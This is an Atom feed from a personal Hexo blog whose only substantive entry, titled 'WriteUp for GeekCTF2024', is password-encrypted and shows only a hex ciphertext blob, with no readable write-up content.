<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Whirling-In-Rags</title>
  
  <subtitle>un jour je serai de retour pr√®s de toi</subtitle>
  <link href="http://deepunk.icu/atom.xml" rel="self"/>
  
  <link href="http://deepunk.icu/"/>
  <updated>2024-04-14T12:48:08.594Z</updated>
  <id>http://deepunk.icu/</id>
  
  <author>
    <name>DeePunk</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://deepunk.icu/Untitled/"/>
    <id>http://deepunk.icu/Untitled/</id>
    <published>2024-04-14T12:48:08.594Z</published>
    <updated>2024-04-14T12:48:08.594Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>WriteUp for GeekCTF2024</title>
    <link href="http://deepunk.icu/GeekCTF2024wp/"/>
    <id>http://deepunk.icu/GeekCTF2024wp/</id>
    <published>2024-04-14T12:29:48.000Z</published>
    <updated>2024-04-15T05:35:41.146Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0102fba61608e3a9657e84a00287b5d67c9b86e3ac22f6ef3e780fd0f11d3585">8b5d7bb9953eea558a492c3e9363baa2516a0a1115363d3a79e0c75affa65b82d985cbb4d7443820d731a149bb9d00bb0ab2a1a20493369bd4db34f53e5bce8a2bbbea9c07d0447c1a0784fc9f130ab6ff271eec0e02975a0408b147fc4a44d4f47cefbc74922af39670ee03c7c401a38ad144bbb86f607d1c1b383f9c9634e33c2843452226c484b8b699b85a3fdd9f55ba284d03290923a0973d1b83d4ce7417ddae4e08b117a7e9c5348f13b6278675014b293faf5efbebc8780f23befc4067b4ddd1f46f0d4bbd505f6bd85c6087424ee93db45e90abbd717f918d0c108c538e13cd92146d0aff675bdf9578e09b64227a9845d30d063ed1f1d5de56ae9dec096e8e175287cb0397ed084ba0aa5c918dd0fa30f698bdee1ec473090897432d035038b4da58496628899efa34e94a7e2ecbf4d88e08e0086afa6667b8b3d6f7dffa32e909c4297cd714e7a5a56c62325d5a7afd6d61c59192fad56201ed2db5b383beb36fbd682307ada58f0b05875211bc2a0a02ace8e30dc3c12306bc8a2d7c30d0271a4713696684e038ccad7cc463f96e815cfc5ac896035f0af520a6c821bf615fee662842e7dc8e687506496f65b55b58dcea41b629e49a2ea38dac732256f695360f9a547650d337f044c07614c30f30981885f37a0e0392ad6e4b849827104c41120db4334d8802bc0586710f005384955ec094e2aafa4f74620f5cdfcf13ad31942b2d9a3d6e80ba8f6d0a2c9c999759bd98a82c5b7d10d0ebb2cdc89ce5c7162987562c1b229dc40a5ae6d750f7c6bbde016361af13806df616beaed636b96121c9f745688d64327fbe6b485d7652e6b81fcf36c4e0d7c166ad9fdcb5a016868c2b12b08c7925f11c5492cf182d6d8609a6ba2c5e556c21167933e903f6466c42e6b4e2e4af087774b23f37d2ae0d26fe05499287a5061f69cbf865372236fcf0dfd38737108d67b3b88f1fedfd7dcff56d3bda17d2aaee5f38349fe4c72c6ca87dbfcd82dd2f3da85a1565fa16a69a9d30921a26ec40ade0e4525af2df6965b20fa2550d3d5daaca564e4bc321c3dd598e8fd5e59ef41b7ec29ecbc29ebae89782921f4b6ddd288a81a12074062e8b17d46c60fbcc0251734648391ebb571ba99f0afcf5ac62a4b3ead4d2dff431dc866f8bc877f5bca80f7820b2d7b3b6fc7f2c5f69ba4d2c5832d16094c3c1958fea10b23ce44b6837a7e961bc6bb1541220c896608b98594c1858b3b6cb6ad03ad66bf65c19231250d9a80b79f41fe93e3d5174bc280da3c96857a92243f7e5f6b0a2d82e70efa6cf2ecdf0e6ed4b9a2c2bcd19d68cd43864b82cb3a260ff9cac78aba9deb01aac436204b6d0022973dafdaf74a2b59e6d2fb792d04e296d6a2300cf1ca6d878a6e79d96df04d32c91b30a283f6a574e0e8b464c4bb5742b1cbbdb40ae09e8a55d68f2dce4f2232ae4f53446f8602b7cdb3f7d92a9492a57e3c6938e5c5129e8fbc4355f5ef97540786459a8ddb8e15093dccdd6b063a22616d9f9dd468476518d15536fd07510cfa22a9f161ff307365e21ba32d05722e032158bbc45c64eeafc5a3b99603169e9f30ba212eb87d1bd6df9c6fe18bf7099365fd930c172e32d6217e77e4d13895571cb871c88ad436687d20a04af1a14201a983c6e3c1ba7be60d5c4631d3f6f87f0f90c5d62ee7b45cd15eccae1fbee1df40795d556fc11ca7031fb4cf0a4a252a6f6cee7350325b8421e29c347583494a186db8b3c29c10f1edf8f8dacc5464cf715dd48fc403e7494d8f7ea59e0f9ba23b70fe4642dfdecaa95ab51ac84acea175a26e69a5e2a1ffe745042b5ee5602fe9d95a1d3d9cd171e7922e9160e898be855f1ee7227e1ae2ae4654dc30339004fce7c2ea917103b2e9e71b452300e1ea7c49e3dde11c5de735ba86618d76ef83a2b07754336f9adb71b0fd4425a77f7f98cff94fc7bcc7011e49b4163ce9425e655eb1832f4864d7e2305d7be10cc5e94cca78ef4178e8c9755efb0ecb5e2f889e3f3ce8859269117f4b239d5aad6b7169a685fdcd33a3e8280b9240740385fad862e0f5c1ff90dd5a2d105ee7cc396da891de196d565a28a86d15b2be7bea8b3394b69718f431b69c933db77e6507e34ed3ee013fdd3fe90c5a9f4a26fde1a1c489d821a9ed5e704ae3a8061a17f27a52874ae84b1eada820b66cf53309cdb189b71a89a818975879da4db8560987a7e0278be761ea65c629977424bc1a917aeeef62464ad32182bab76d137c67440d2366410afff26fc0a1852b7ca801b2ef4d9a6cec4ecf623c1b5cdfbb5eb66a55b82f6303bd83a1866d79e12351baaf80a9adb635f6fb3bad2eeb5b93f2f40b4c260368599499ca1490ff94c0209a9412ac5bead424c83a03915b8d23d1f0c199911cedeb765772bf0cbafe888be693b6081e81e77ca908b04ab49c47b319e711e08bad804bb6abf3b8c4e417a0bc46514fefcf8509637aa7fa880dfd944d6eca093ccae86304cc6a3ef15c66071e8620b0992c4661b57a7304f56e854e9506bfdf9ff582d8f041da19092990c720415991172fda0c7adaeb45d780f1f60870ca5629699fa43c445905e8d2c6256693c758df49ba9a2ba4ca9d94228d82d9a7dbe97c1f8ecd820020dddd18f83a28d66bf7cb067e5f5fdc87ccc45bde6b3d15de8181a79893f38e305fc294d915b622060e217d21b2af5afbfbd951a84b7a606563f95fa8256237013e49da6c6d98731f725d865ab2d43ce162316aeedf3a7f2fe71cec562432dabce37cc1bdf109dc5299d5f89a2f02323ded30a80d7eb9fa5fb6ab6c23c7cfa058e0647c54c434b1537af070cbbb508c6c4a95db4672543637ed860e9af9ccbf846a1e39a98cddca309ef6f588106dfeb7696265b94225a3de44345faf1266d0751ee682dc9a8f788bee87c3de955eebe8927a6ec774cfccf6c309b04da0a9c282624c01c707f75c0f340f8eb048e4fe390c03eb96b69ba0d380a12a098265147303d748f5ca5d6e3232376a9a146d9a8d33373b91340f85932753b8ec185d018fa4c6ecd013e111755460510d8671b4c45c73153c8168881f9c725e89332bcc25e1c0abff8308227f4452d320c690c24b9fec519089997f3fe84e50880f28688538b9fd9820d85541d5a26c83e199dd4a5e7cb2f47e5e2d7b8be73dfe0e6932baaee17dfb91f7215504f0be59fe1888d099dd739bf06c67a3fef7c9dc1af5b2894e8a5df1e0a0f4c70a8e67f8ffeed9880b9c75660117aafa342239da001b0471913a7ab48e80f82599fad20fdb31cf7d1c6552c316f435cd8e9d8d3adbcd7616da8a39793f50dd0186b0c25ad592bafa95dd917dfa3d058126e8fe5de00717f556caefbddc8c16cb7efed73912b6235217de9af2295e2517aa3ba8d9a8711a4a7dec61ec814aabae26c8651552afeee71a289426b2cd5c7b197882aa9a5cc755631ff12bb5be0ed5daefb77ae1937549f26ab25173a667080b18352b7233a62a33048c61569a5d59f013c8e16c8d2e6effd49f2be14b1c5e586963cc8428bb6e473c8b857966d21b421961a8865132a385f4ad2ac70b73cd9fd73d20d18f263aa4bca452f2849cca65df595c0e17dbf6d952e182a1b21d98d184c633fc832c68eb72724c46a58d6e45540420ff1e640e009e1224363468bd6586d17098fac2d1daa5dceb7fb590964593e2356e1307b318cb589d1d7e288671c70d275c498c1ef7614c6e7f0837f221a6d7093fb44078969e89caf82d5d745c6d6714a34bc72b7cb485cd44a44f9f42c4225a393f199896b0ba493df684ec1bd02ea7a2eef6c6992ec50a5543231b178192116f30485380deeaf757909d1bd7c1fcd21a1bf253edcddc0374bee883f9dd1e9adaebd5c5fdd51458114b10c0fbe2ce46d828e9d0c19809ae778b29a80e0c65cfe38a7972138a85ebfc8b754f2d8ec24e5b0b2dc99dec92f7153041b73a15174292ccd048630a01550c9e9e5b8b16a05a9abc2c7e84defb828be6845232097b9fdde3f6f537aa38280e9c0bc6125652c932d38f3ac85cc6816ae4653a3d5b2cb7b45b559b4122444d2ae756ddab8aed9ccc7e71664ef0591ad3a8ea8c3df19e2c1856022762630b631e505456e6229c99a81806917317e4f0d8c7c42f4427c8ee82a6f0815b5bde83fee0ab7dd7ac43637625a95b062ba3d3326d6e04c2061f96bf9f482c8895dfa6f6d3a96179491104f6e1a1a5e861eb77eafa4fd30226112700a910b02df72f20b67b68b44e8b794dec565a7035abae3347268c955ed67efac64e55cc97d8e1d0e067206fe82df2e2606c0f6dd6ea9374694f31f68ce3e239890faf82a555d266feb981c706094cbed41e56f79b57f097e382d9fe997751b49f13eea40009b0daae21ac4294edb5afedd153902c083fa02aca32843a4bdba9ac6a73fdad8e5805f8a637e1c813f2215a0abb44ea47475b83b0c3e84b009f80f88565efcad3f140718ce8040d0cf56a32a16bad68f096098e113e77c83c1fc7268fa68a587f3c756c6f0f1579481605c3d2e0f90e60b0ebe5d415fa0c4de0f4e97982b88c23870d906970ea3ca16426374fb4c7d61f4966cb92657a2151e6eadb026da16df34caa765c5ad64cbddd003678c3845733e20f30aa15a93ccb4f41ee09a1ee9e218b497689547e464de6669f9c2b13f474fe87f74bc0d8c87195f87e9f80c80d71e0576eacf5e5e97d0e9c9411c84ddc3ee27c1bcf6e2f8e82c17964cfa3c772b5b1b96e9a4561c9cc0250610f4753487db2cb7f3489c76742358b73469de6c60c5ba478f420764b4d65fbc2e4afaa9fb32617ca086a2bff1869e478a8c5b6ab1ec58ae0368b3c2e6a000b39fabbc54fdf834713e1560ea65a677d8e34675911cbc3206a133a4a9b56f1b3dfce3f8af5a5dbde48d7fa8367faed6135250b46b43bf45e388bce776dd2b33b3f926568bde817b852d76e79fd498f829bef748f412502d218df0e594c6099cacd0cf6fcd4bd1445b32e6928beb1b5ecae46f28212e1347cce083845c0a605c19bf75ca325d328d3e85429d8e46a78b020f9ff262ebd7386632334bd8f25a27158609af14d1444a98cd063fb50685ff3129257416fc1f80c3242f7115ab98e85e66317cfae65d469a28df3ca9cfe4112949b31008fa5fd025476aee85243d644d3b6ef1587f75e0f85432637f0418d7fc3db4f2619190a229013df1a8f295e4210691dbbf195fa2bf415c60172c69bb3ab07cfb5679aa1d4d29978bc593019e40f1bce1cc6e940b6966e47fe43ecea09f44cac9a659dc61ec80e483e6385b7cfdba1d0c0e4bbce5b06eae159b9b1f1716837c9f3f090a514933598a005d70e83d6a34d571bd8c4db8eb0784c307b4863b2d57a9f3d05cf0a619288a00dff4b258f0b2b4ee5596299424441e7cf1b77ebdd0e732a7a573b93b4e13e1645c61333f7207e67aebbd367b927d1438362df03a86e584f2388504b011a4ace239b41190928010b1f5de97517ec490c910f360c057d8979840f817c4417acc40e7fc3462a7c2ae8f53fbc7f8808a0b36bdd56bb0746ffb4409c0008866e9a997531cb05dd58b8685e7ded3cda165714806d9b3d69fea081edbd3453366137f7fbbd2b77b51d54a916ccd96723c063a49961d1ab197065dee4941311e7f6b64054dfaa92af5b74b8dbdc451441f260d295dcaf1b24d873b69782963bc00e89b620e1e7b38a4dac36600da3163c5f64ce4fe09f9cb6a332ff57c6dfc25b183e4655c3f6ab2de83199a19a5ff48b234b6c6acfe4a3ca92015e725bac48c007584108870697a80906061cc49d5408cfbb8102335fda6961b8c09888811e6b8c4b0e8a44238a496bdd648933a2d5774121e34ed3c49fc0471712d39ce96fdb0e95e5bc42239a824f18036a4840e7327f3037a0468bc887028ef8b8f507740436c2d80fe8373b0044524a853da89263a0797d82b4a953ac99b0e336d8fe4e38f66f511c0f1b4708b57066e4051af5101eaf4c96ad86674012ea2ebc3d21d3fc341b1198e0f79cb349c2080ebbd3ced254f1f0eab5ef23b1fabf01e5915b7f659c0236f9d54aa4aced790d08ad559f3ab0417a8f3ce0fbd91cd237fa6102d465063c501f065f186a186e0e1b27874c1ed17aa4387df4c31ac830188e25aad649b06b83fc12e7fbb3549a0d69a1547cd7bf6b4befb26943d141730e682587e640f7e09d608c3b769dc2b7ecbb703b64774da7677a2e10d30fd0132c70d594946a1121fcaf0d6ffeeb26ca6ddbed0ab27382424d52dfd4c1b77218d0ab18afa3c507b1c36db838203d02742cf604cb89d8febb1362acee82b4047092a5c4bf09ad6e33ba7c633c8ff93f1c42e59a23444c66489f993a0c083712864e91bb67a95af07737810395e02ddffdd67fe0086bd27867f8f14675f5627c4f63d4ea201e87283ebda9a9a086220c1717ccde55b75cb0e193133691452ecbab1eef068b8d02a53a82524f6a0a49465edfe2d7527db60cb6d9641d9ff8492f2fb4a21166a4210cfe015e1dd5dd41b6f52f08a7849cac77b2150cb9ed6ea951579c121a1f9e3f20f6ceb77938d5e68be4df748425f98c017765c7b7132f71bef706bdae3dd54787b9ec28a543589760f95474e5b7ee5cf9ac651e02395e357bbf52491443aa5baa76d1044f59d47c59fd1b644dcf8ff5c4cb4f57d6e6d269ee9c75705819b48f5424b8f66a7ff2a65e8c220a341c92040a510f5b63a16f85943fb6485c1c46d7d7bf9b1e94f4d42c22e0870260b539f03f8d1092f77ae18e1a9b8482e23c9b3f8c3de04c32ff677d7ed09726852f44409a4d9b0a4f1836c4eb6ed4dc3a402fd0cd7620ac66796a91144ecc238e879a3d27bdc8f697fbc8bba6ad676291348fc94bcce84cdae3f41c994a041df53d5b940a763b418cc899b04780b89d22aa6050f61b081a82fb8e2ebab30fc0ee2617f6470e472408a59038641a3bd65f8c8d43bd39b47314226ca96ea72cf2aa8d606bdc0a56d96a0c9837ed76220b8d43c77128326ca5010392762f93dd800c20224d492efe877aa1f5cf905e4f8a34ee2ad0b6d27e27f1328d748af1bbf5e9c61fefda52fd07a05771c69e6a9eb54594ef53e054dc913308b44e171bffb88dd4be3f36034fe5a93a2cfe5952944ba00349d812bf6bccc78b5e8a7fe7ab4cc13e4cbbf1cfcc4764e69d80d008ba1ad074b86df6825c2888d8b493c748997f7948b3ec05123c30e3197548709a9618cedfd2501e86bde4498d26f64005d1217066bc2ce3c7c92c870962b510bc3d7dad712a4be2e9e260002aa8138522c8edbc41c8c06d14254f4281acd1cba8f7268b604d967ae7a00b3978210284d4f22556638f93978a6a4bad014d931def823e251f3e964ca256b55fadbbf8d451b549e65d9f71d8c569e0e99ee3195c2808d0178c01cfb9274fcde51ede3db42a30607712b4e28b930dffbaf608485769bf4ad8c6118bab3b606d9d1987aab9fd40af91fd7ddeb8cff9f16a26bf344f17424e67495eb6cb429fdd10ac8280c513d8c873ce9951a0553db11546c5a399f68843da58aa421dc70166ff10d5137fa48ef48224b60fe08c652677e87330dfd2a3172be4ebe0dddae3590b9d9a72e5427d630a3a4e1e0af5d9434a9d75abe0620e37bb1d272a6796b1a185c86d0e077382907f75e8571bbe1f3d47c645334a8efba71a748686ce2f4508a3bf702e7daeaf69f76b01e166a276ec0b6bf5ec405b480db9f7f27660178da0ff166924099dc7e09ebba9076bc9433e976cab8564feef1d47e4156bd6325aef9647d8aeb67a104d89d769998cfe0cf2643945dbc8657bf4c2086e1d18ab57b41aa9ac9e8b79f1329a2fc02d4baad7e3dae8d51266422fa18cb7e2f00ac6323d591f6481b71d48ae7ec94dc95bc290c0dcb066e5354b120198c89a82676d3d3c103b9c03847abbc77d25c70ff65a67acacc004484f3459e898bae70436172721a987f074f9506fa1e905c2ac2dbc4561c3155dc5d284bc8efb21eab192e6d9bc8d4fa0a0c6f0d9ffa4c6a4d265e0616f1fb7e23dd43d5ef75cf20048d3620cb4ebe6dfe71acfccd2d65f28126f6f20d5d629c6e0b17d3aa4a90b1ed81e94f2016d13a4cf867e0d420f774ad2b3fe833f3f5e24e438848adfa757feacbb91be432d97be61efe4797f9e24603862dafebb4a69994a546783222dd6f040baa8a8cde681e8db7a53a8233abdf3bf0dd7f72931db72ea48d297b9c2a9e330e39387f65ec0bee3c28cba6d5e9d7fe53ff2652095b906866865737633822ebd101559edc0b540ebac583469b488935e05d2ab128597d2414322e9257ede159fd6d8969830e8d34997df04ac706b9a239692811b0980f454982493cb795338201f96302115fcd338a52e268afaf762d604828f37ad7b7d3867ac9f4efe6cf5d4f662cc97acff450ec7c78191d80e0c2ec4daee8c8e5c86328be15a5548c5950793e32148fe26c2516497d492e34c6bbd68342b74b5bd133137db293ab9a6bdc225e77a574da0e58ba78e8928771ccaf11a2839862f462c392f84ac10d0fae40b5d651376bef63aab90043bd5ad727201c1ebbe538708780eda6325d94fb7777af9b4c311007ec424ac1510e40d7ed39fecf579f0ec868dc16cd56aa3acd53d860ef73535247b9dbb01e298c20840b147e150c65e6f8a6ef95036f0b5dadd16d75eb7271575796550d06ad19ed1b0c8e64201000d2306940753beca834cbd74aa7366c7ece9f1b836282040d3a6e5d45139a72078dc5d612ae21615444225cbffce5bfcab970f4b01d71cdda029444c9a630ce4f35aa0d93bfcd0084b16df229e9f73c6e4cfcc1882ad77ae4b71e3555cc6a94e0b22a96f597e2bcf70c163631af9afeefe7ef56f153f297e1750224af972a969c6689affeb9c9d2c3f536d0a617bccddf4b517a7cc81e66a0ef8bdde3804288a544d189dffba7d8c471bdd3af9e6eb0176b23d21a9fc982156130788c8107e0bc7ee7df13ad558ac933e98057722419d5eb62f2fd0faa4a63cfed8ec6993335eac75f97d875ec7700ee9271693d63a719822d4eba0ed8d788f3c12bc63cf2bed3338cbe47e8030d445553164375e2b192ee6be4da6a040e4c553f723f2f9ed29bb9fef2af53aa4fc892f721585751ed30c1fdd7239c66ad762c95430b9fe40f9e65bb19ae5f3d83d460553592fc02ef7cff2bac5337aa381a7a5ff85ae991a012da815244306f4ca159d58f4d5ee5abfa56dc2c6746279dd83f31d56af8ea1b08c2218d77434c688d0955ef27a7733949395aa8961b8794868acd44fa2fdcece4c35237a4e9b06ea04739dc6be7469d76ecca9e6c88342c56aa8772a9151989f188bc3f21ca7e162ae0461025e3373a08049161e48a4687559d8afa16f4f489848db9ca10dca7cb976fd223dab89b9cb30db0550d2d98b7833f879f03acad7e15440a5f3d078d3f8fba0ca1c89fe797446d7a1136aa952a7a766a159570fbf90d509f33263012accbca53fa5519b49de845d37fd415360dc69caf730a3548c88a6c3270a85d62743f2761f7ed2427c5ea3bd02781e272a780ebd1f9329b9affd627a5c4fcf15fe8dc3d54005f03d2ebd61888009b797d848416d06d6881d5f1b6dc1991f01aa33be509bcc97189e9beffedf7dfeb9311183a11c223a31053b9b625eed5cd07e1ce8440134ccad7fa25b9667936d40e18419e69000a0f51bdb4e564361871ae16aabc28f759e4c82398abb479fe5282e99eb05ed0336f9d5f358256b7246dd6bb6d5d9631423b4ae2fc7052ea7f44f7fe315ad5bec0fb43ac95adc4cae67e708bcf74b99d54b22d5d6b2c0406181d3a49cd072a61597d309e00d7bc69adf51548c297599443d2a35db614df6f808a86d3b71b4a8a14dfef73fe987057256c63b41e5c6c7579982a90dc540f92e00a92c95fdfd059658eaebf465bd466581abf290ac0128de67359611ef721d008ce6ff09e617e0ea89eb2b05df69b975d3984600dc06a99695d2eccbcd10d86cf482c1b42b5f49e0f3aad89ba15de4ea986378ebbdf161dbe7d68e1d84658d3519e40eebb890c6337b9354045bab72c9ee9e570a94c07b3c5cb77a463007f6b2947f06c18badcdab78e233dfa41ffb69b19cb06230858ae14a6cd359a235689e8bed8ffceddac5fc7bc42be8c2552500573aaddd691c365feae4a704fedbd7acd0737d83b846047f8855ec3a5f5bca9c6198a055495c45cbd28cbd48915ea00e04bdddad7dd5144d32e97e7041f037a0cb34d791651ce2c9d66a09eb7f8eee95e98fd901a1f1bf22f074dc2a943151f7df901d0d72af5afea90087167c9ed8d29a78cfccc697bd502599ac2e7bb2d025bd2f64bec983b9115309dabd3e29c207684ef5166660d224823b8b4dfb4f55e9b1f9e6eeeeee520a751c67d3b74a3c1245aa1cbc89e9214fe0e972d8e490d2e45b14bf2ada9057ef4ad493ec33b8457dba332afddb2afcb36d3dbdf814cd648735c8e9b9a176f22419ebc08e14213efe5df1e157618b4871e5454246236cf8e3418dd0f342b36bd05eed7772f53a14783278f0e046445c6c2965a69579385623ca8313ceae43b0aec95a118f827ffe6c101d17ef21e39abbc1064cc75f7a3c233c185a56b5c9d4efd9e3d5022104ebbdda849325f8222355df6a764cf7671824168f5f58b17902caf38428932fd8b7de8c3d5ac148de3acedc39669df04d2e543847d2cbf9cff14650b6d35cb996d839c174cc61f91ff98faecc12fd71551f5382c0a11947eb36a1f641c00bf16e394bcefcc549789ef6bd0d567cbc08210333b6016bdb31c91519a5bdbd24ccab166255755679968010e18f0be1e4fa53ec963f81adb59de94c43972acb91e544d6ed1ceb0fbf89326b1b7e54feb20dac41dc3ffef566e2789e61dd4c2d602c9ecb6c56c6e7e489041d2a9a1808c8852460814556ba3079b8c0370cb12192499b7a83fea3feecf79634a9983a9749d1569f1d22d8a26010e75d1564c114a27468bc7fb466430f31c36815676832ec57bf9d8e63848714a9d60c6f1890ab7e3047aefbcfe713ee461f0354425c86bfaee7a0e1eee72c4a7ce392ccc1196d38bd4edca3f82824fdf0b6e4fa57eba84b9b6478aeb9a263957abd4fa59069464c5481c9bd4e77414751103802163d415d5c865fb4617d89de9631efeaf9d742955b6bb37a3c03194745340261020507f768abd1f6c221325acf1e7655af61546a385a16b622f977a7a797ae6e7df5694b7e8d5885b0246d249fab52300a140cb9d2e4435b32ec5604570ca23dc2017919b35b3f17c32768d702dad73a7d1dda82a318ee1a5b84b2d6551cd48ea0524ea0b1fd30014b816b9b9335e911c999791d6914c877ad2d1abbd8557eb8e575fda138826bb27a5975ace5660112aef257c65ed35abac8a38f2018b525842271e7c0493c4dc2c66e94ee3c349036beed085a04e816e4cc7296be576396db393aa9152aaa743be5b1f3dd01681507bb7789b867759df3cbfe41ec6a84cfb93188bdd334941c18fcf4c04c0e34f0bd7f45f3e3ce0c9109953d7d5e19b772207f969919af020f65f79764814b4e101b5cb79aefbdb3fdcd0e5470c31f0dc3c4ccc68b4c6113f5e22238fc1fa8203eef3af0e602e07e3a7cc7eb5f189be8c6bf7618412dbf06c239ca730707146e71e304bcec5880e5495213cadcf634133a58300c62e1a0d0030ca1a555615534ce5f5651651a9ee5376d6d77bebcba91511555de84336fcc59144c2df35d71812cb941a9644afef3b8eccc43d138cf947f9ee5b7e66f7d539f3d217124c1e9f91abfda252ebe41ce725fdaadddd33f9a44b16e051e46b9a8ff2f97670ce45bb8ede6110430de85221062f2f7d7abc28ca3e7be1dcf16a0a4755bab933d28d9bfde2583e2fa6741cbdd8786ff0578a3e852b5f44eca447cc0b1665c07ece2573f153de8a96cf51a0c0d0d31dd2634269f24ec489790aa660c87d2934e8cf3ce2b8235cda4f91a53cd34c95ec6e856a4d7664414b6afd922c4be24331adc646a64219df6490bf98967ad3c70d2ed338a266fe87811dfcc33abc6a4936aace5d11cde90a7db39ff94f77112dc3e0ca97d0a7437f3a89486cf1aa4a70a7fc586b3ab0947bdf83257c92013c93a088109382b040691b4acd7006c2a23adafbd701ef04f06d9c36b06355638d2698d39d886b7b0a69b77f149f74539244c74aa0aabc065ca30c52713e8dae62b444ecd5ab3f7aaf00f13e5f5a66e7db9dce7039cc131c1f746ab074b1b9cb53e6614a2939792607a2a4008e8e897939bd13095164ecca3b7bd79564001f83c1910d2ecd5b2a06e286cc4c5c9e12d93c23b3da8363b5dd16ebad2ac80e48948070a06002a508f531161eb1422492c722cdda3c7db8774c498cfbc154ff30814cd4a80543ec2f3b03d4851e2b1011ee74389d1c760532a6dc0070694bae54300a26915315f4521a13fca5c41ace15bfc6d8de0a2e967ed381f58b08d6f8561079fb7abc6ce1e0141623a0a442af5928fcaf4c8e00507275c41d1ccdb7a87c1ce221aaf2565652003fe7ecabde02d09237fd9df5f37ec78bdeef01f91f3419a95bbc8943a3626e7e980ed44addd0191eb1671575026a388e3a896470fb65284d1b3a719b3439c245b371a8b0778d3771a6601bc25d9aa5a66b61489622910bfd599616ca0343d258d244f852e4478956f575b3005c54280d1a04aeedfc702e66924f731ed7480006d27cc72bc7892eed738e4d34d0b6c983d46d824475cff5e25aab80172b6ed78037cd4cdbfc4e887fd0076508a045c4a33fb06bea40e9872674a5dcc7fc981adfea6987bc55687d81e3e89f62d5df96ee68a86b92ec4b62109f0ded28d95064e9b8570ef284258f4291af5140a99a90771e2cf12ab62d7b46ea1d8de87e41f3473bdd137beae9158a4c0f13188d5e4d7f133897b6b175f61d74860fd4b93bc22fd1f223d856f5c796b51922c4d957d0dd00fa89e4bdf42fbee659dd9f38887cde35a195b184ae0465be7ebc28861a30e82b145ff55c5eda79f15b2a4b9946504f717e7fca2e96da7f65bae61d8603bd02e8cb810bdee9b03bf94e1e1ad6af41a1ba5ac10268c9635e74348ffc888233d993b875ec4a6d252d4c27cdbdf1732659981406c26266b81c61b486ac41239160931a997dc5498c62b6b2e98cdf85cdc5c29867a87055f6ec6f0da97365faa0b2e2d608538126d6e6463d74f343320df2d4429f6574fd0b9d09aa98f92282eea23c0de0baa7545d00953891810e45e9d7ec3fb853e3a1ffba06cb259af884419f0b758d5eaea0f4512c6a5297ade228eb56ed7f2d76dde1034fe3d2f8e8be49e76135296f2d4788cb2c70b5463089ccf34c598f358d3a15040e480e40a4d5d4ae23dec01bf6417de41d286bb0fa97ab4f7981a0caf88ffefc209dff84227de07c46b8f0f9ec017922d1c172d78c1b1522e4aef8f78706e15cf7bf5bde99d326c78067cb05c58a11be976b1e9de5eb83623b9dbac5095b0d3577abb207eab11c28617ed0fe5facd1e86be91d5ff32817717d71a2a983e76ad2d1398f6a7dec899d669db5792885ece549938d9687f5a43433670fc72d66d66b05d7c14c57b5cade75c387debe06985f5c1ea36d5efe82afa8e0b72ae02193102f9984b12ef11a6d24110fd45535bca26fbb14466394fc9bcf2f92469e288c2ad7d6c5ba74480fcca4e572ccb4ff48c9c1104b8ec5f496f961dab964e2b49542b4c199ac8a22d7bd286a8b768f22c39155a4971f1b8258aa67486b333de6fa503ee8a28d419209ec59783697ea627713c5c43b511bfc832b9e1ad961c9125ba1d62a226606d8b5e563353223d33ac115ed80ca44232b0f85f540f6c38d620f30264656930e2bfc7388f1c15a94f26bf462538620d97c1eee260e4fde0e66ff4d8696c8a74da9b163a4a6816dc3c086cc72ae8b43b0e2d8dccc10c99aacdcd478673f0f0957c268aff6940a6543aaf53dce53be6fcc3eebbf13167b6b22e2ccb1e9ea99d7c61a0f7e6b7e61f738d729ec334b9b8bb16e8b05ed1512d697122924a7528d4d3d3cc564de407120f92df3cbc88743605c8974310c85d2ba977cdabad8b245343c0cc7ca359f22375f922bd1fd57fc1107b4c7da9b4d4d6c0586e4aaee6d0219fe84b52579ba56744087b19be9f09bcb9a5520d004a544e88689c9f0097a1f8d52f879d044d47dce3a526361e08efc13003f10ade875ebdc6ee7f5c8593ecf343723850550e245db897829dd9ec766066a8ba15007aaba67db77942f0f2c86f86af371de201670fe974e8856263bc32903f2f9db7fd66d6ec9b31f0ec91a39a8c0d207560a74e77e0a66487e01cfdd54f0a90ef87ea574e4f7a10c498c84d1cc228c931f20b9cfc2e3a12423f0fa048c7497ee91926ef22a640b58eacbc6f7bd738c3d7f0a7ff9a4c1367109fce5a9d5c2b71d23ea76044f135dae1bd72797aca2b648c09c37180cf8c7ccd3c653e11756249fab41c763a20d281a3e1304687895e4d22c982af7cf6192d0f2dcca39225b6bea45faefb197e4b23021c62b1e0e01f909d564010fc7c9ce14330a4fe85ed35bc58f811ccc243c16ebac9c67e145c31b866ad576805076a0bb3adb6944b31b3549671bddc819f81a3e60e49403ba01d6a1694fd8876d821acc5cf1f7adb4ebbf2f6da268a8250436c0ce05ee0f2b7dc65d4056d43bc75b4321444876fd082baca99028b6d5edbcf0d3fb8fde251692810b8872c20bcfd6c232c4b1db197afeaf01322127145d8e204e52173a60f6fd2354e8b92ca9630ac5d9fedaf53fe8fce0d35806f6ad77fccbda8a115184d84a86838f526204f5bbb611be0e26b6770b719f77bae725e3290466f82f443cd2b2da566d0ef18959e4239ce97b02af5bc3ace194be514753ed0e87aea33539d257f4f04456f0e0a33a91aa4f32dda6f349009e3810bd2a1bf64de99656e3845b4123809e04871575de6385edca46104ae9de51208f08fb1e8c427f8579f7abe57d3e0e8efc03a20e2028ade23c70443137c3929033a16ca5e7367800870e89a4d40fce0ef7d7811dce73f38ec0b330d37dde721245b5fc62f9920f034fbe18bf404fea14bfe775210941d51e716f77497eb42055367c8b564c3896f5734b45caa28f7ff802992e60843a7f00c69d1b7d6611882899e0d596fbea5ed0504fd52773e29c885e3f0998216c06942261e4511059d0da167e248223baf7e8d57ed807d57acc179d9c8bb1469aa87147c11e247b1ce48c381eb3e880816376a058112cd66ad41df51dc288c9f865df21e3bb0f93127f421d5a5e07a2f97c9e8a8f787693d8f94a9d2e6dd417e3785ce49f5cd0ca4d66ea965cfa0b6cf9fbf3493367fdbf3d869bfe8b24d2a4bbbac53d1b8812c7f722bc3247e11f91ad13ba6d8afd374a59ab79d2b08f51ba0401cbb648e05c2630d34449e60f15c585a2ff48701f37959f00b66e0f265ef68d5dc3e6458ead509af55744118fe05f99c20dc7316655d683b1130cde7698f20058793a5a41904c0f0a